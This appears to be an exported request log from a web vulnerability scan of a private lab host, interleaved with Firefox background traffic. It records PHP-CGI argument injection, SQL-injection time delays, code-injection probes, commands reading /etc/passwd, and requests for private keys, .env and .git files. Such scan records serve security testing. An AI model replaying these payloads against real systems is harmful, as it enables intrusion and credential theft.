Id,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
479,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-linkedin-digest256/1564526481,200,OK,164,501,115
480,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-twitter-digest256/1604686195,200,OK,103,472,212
481,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-email-track-digest256/1668785275,200,OK,103,473,8821
482,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-email-track-digest256/1668785275,200,OK,133,505,6933
483,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:37 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-email-track-digest256/1668785275,200,OK,100,473,8821
484,Mon Mar 20 21:52:30 CET 2023,Mon Mar 20 21:52:37 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,7109,230,84
485,Mon Mar 20 21:52:37 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,2239,230,84
486,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/param1?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,68,432,110
487,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/param1?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,50,437,110
488,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,298,229,84
489,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,170,229,84
490,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,156,229,84
491,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,178,229,84
492,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,476,229,84
493,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,471,229,84
494,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,251,229,84
495,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,359,229,84
496,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,518,229,84
497,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,494,229,84
498,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,369,229,84
499,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,319,229,84
500,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,52,327,51
501,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,6,326,51
502,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,9,326,51
503,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,12,326,51
504,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,218,229,84
505,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,283,229,84
506,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,320,229,84
507,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,417,229,84
508,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/,200,OK,5,229,84
509,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,257,229,84
510,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,418,229,84
511,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,348,229,84
512,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,252,229,84
513,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,313,229,84
514,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,242,229,84
515,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,144,228,84
516,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,191,229,84
517,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,184,229,84
518,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,210,229,84
519,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,168,229,84
520,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,POST,https://shavar.services.mozilla.com/downloads?client=navclient-auto-ffox&appver=111.0&pver=2.2,200,OK,1161,201,1497
521,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,231,229,84
522,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,319,229,84
523,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,240,229,84
524,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,357,229,84
525,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,422,229,84
526,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,317,229,84
527,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/elmah.axd,404,Not Found,143,436,22
528,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,172,229,84
529,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,375,229,84
530,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/ads-track-digest256/1668785275,200,OK,453,474,56086
531,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22,200,OK,398,229,84
532,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/trace.axd,200,OK,226,229,84
533,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27,200,OK,165,229,84
534,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-track-digest256/1668785275,200,OK,216,502,2165
535,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/monitor/collections/changes/changeset?collection=query-stripping&bucket=main&_expected=0,200,OK,23,521,223
536,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,243,229,84
537,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,200,OK,179,229,84
538,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/.htaccess,200,OK,229,229,84
540,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,200,OK,145,229,84
541,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/main/collections/query-stripping/changeset?_expected=1678736907773,200,OK,168,523,1854
542,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B,200,OK,157,229,84
543,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/analytics-track-digest256/1663274228,200,OK,496,473,10230
544,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22%2Bresponse.write%28%5B515.786*69.172%29%2B%22,200,OK,190,229,84
545,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,https://content-signature-2.cdn.mozilla.net/chains/remote-settings.content-signature.mozilla.org-2023-04-30-16-53-14.chain,200,OK,108,516,5348
546,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,232,229,84
547,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B,200,OK,242,229,84
548,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/.env,200,OK,285,229,84
549,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/response.write%28515.786*69.172%29,200,OK,410,229,84
550,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-track-digest256/1670952926,200,OK,350,474,15414
551,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,392,229,84
552,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/lfm.php,404,Not Found,43,431,20
553,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/.idea/WebServers.xml,404,Not Found,8,428,33
554,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/config/databases.yml,404,Not Found,17,426,33
555,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/config/database.yml,404,Not Found,52,430,32
556,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/.git/config,404,Not Found,28,435,24
557,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,475,229,84
558,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/.svn/entries,404,Not Found,90,429,25
559,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/.svn/wc.db,404,Not Found,50,430,23
560,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/CVS/root,404,Not Found,26,431,21
561,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/mozstd-trackwhite-digest256/1670952926,200,OK,250,487,337079
562,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,529,229,84
563,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/server-status,404,Not Found,172,428,26
564,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,507,229,84
565,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/core,404,Not Found,50,430,17
566,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/sftp-config.json,404,Not Found,22,430,29
567,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/WS_FTP.ini,404,Not Found,35,427,23
568,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/ws_ftp.ini,404,Not Found,44,431,23
569,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/WS_FTP.INI,404,Not Found,18,429,23
570,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/filezilla.xml,404,Not Found,92,431,26
571,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/sitemanager.xml,404,Not Found,5,430,28
572,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/FileZilla.xml,404,Not Found,19,431,26
573,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/winscp.ini,404,Not Found,48,426,23
574,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/WinSCP.ini,404,Not Found,4,426,23
575,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/.DS_Store,404,Not Found,12,426,22
576,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/.php_cs.cache,404,Not Found,7,430,26
577,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/DEADJOE,404,Not Found,48,428,20
578,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/sites/default/private/files/backup_migrate/scheduled/test.txt,404,Not Found,15,428,74
579,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/app/etc/local.xml,404,Not Found,35,435,30
580,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/server.key,404,Not Found,52,430,23
581,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/google-trackwhite-digest256/1604686195,200,OK,493,488,1470328
582,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/privatekey.key,404,Not Found,83,427,27
583,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/myserver.key,404,Not Found,5,426,25
584,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/key.pem,404,Not Found,67,428,20
585,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/id_rsa,404,Not Found,5,428,19
586,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/id_dsa,404,Not Found,9,428,19
587,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/.ssh/id_rsa,404,Not Found,45,426,24
588,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/.ssh/id_dsa,404,Not Found,5,432,24
589,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/adminer.php,404,Not Found,12,430,24
590,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/vb_test.php,404,Not Found,58,428,24
591,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/CHANGELOG.txt,404,Not Found,6,428,26
592,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/sites/default/files/.ht.sqlite,404,Not Found,53,427,43
593,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/composer.json,404,Not Found,47,428,26
594,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/composer.lock,404,Not Found,14,434,26
595,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/vim_settings.xml,404,Not Found,15,430,29
596,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/server-info,404,Not Found,59,432,24
597,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/phpinfo.php,404,Not Found,81,429,24
598,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/info.php,404,Not Found,13,430,21
599,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/i.php,404,Not Found,56,426,18
600,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/test.php,404,Not Found,24,432,21
601,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/.hg,404,Not Found,10,428,16
602,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/.bzr,404,Not Found,54,430,17
603,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/._darcs,404,Not Found,59,429,20
604,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/BitKeeper,404,Not Found,14,426,22
605,Mon Mar 20 21:52:50 CET 2023,Mon Mar 20 21:52:50 CET 2023,GET,http://172.18.0.4:30001/favicon.ico,404,Not Found,431,432,24
606,Mon Mar 20 21:52:51 CET 2023,Mon Mar 20 21:52:51 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-fingerprinting-track-digest256/1663274228,200,OK,141,473,3605
607,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:53 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/cat+%2Fetc%2Fpasswd,200,OK,5410,230,84
608,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:53 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,3979,230,84
609,Mon Mar 20 21:52:59 CET 2023,Mon Mar 20 21:53:00 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-cryptomining-track-digest256/1604686195,200,OK,561,473,2261
610,Mon Mar 20 21:53:01 CET 2023,Mon Mar 20 21:53:01 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-facebook-digest256/1604686195,200,OK,117,483,436
611,Mon Mar 20 21:53:04 CET 2023,Mon Mar 20 21:53:04 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-linkedin-digest256/1564526481,200,OK,337,472,115
612,Mon Mar 20 21:52:53 CET 2023,Mon Mar 20 21:53:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%26cat+%2Fetc%2Fpasswd%26,200,OK,13785,231,84
613,Mon Mar 20 21:52:53 CET 2023,Mon Mar 20 21:53:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,13854,231,84
614,Mon Mar 20 21:53:09 CET 2023,Mon Mar 20 21:53:09 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-twitter-digest256/1604686195,200,OK,522,472,212
615,Mon Mar 20 21:53:36 CET 2023,Mon Mar 20 21:53:37 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-email-track-digest256/1668785275,200,OK,782,505,6933
617,Mon Mar 20 21:53:31 CET 2023,Mon Mar 20 21:53:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,14671,231,84
616,Mon Mar 20 21:53:31 CET 2023,Mon Mar 20 21:53:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,14610,231,84
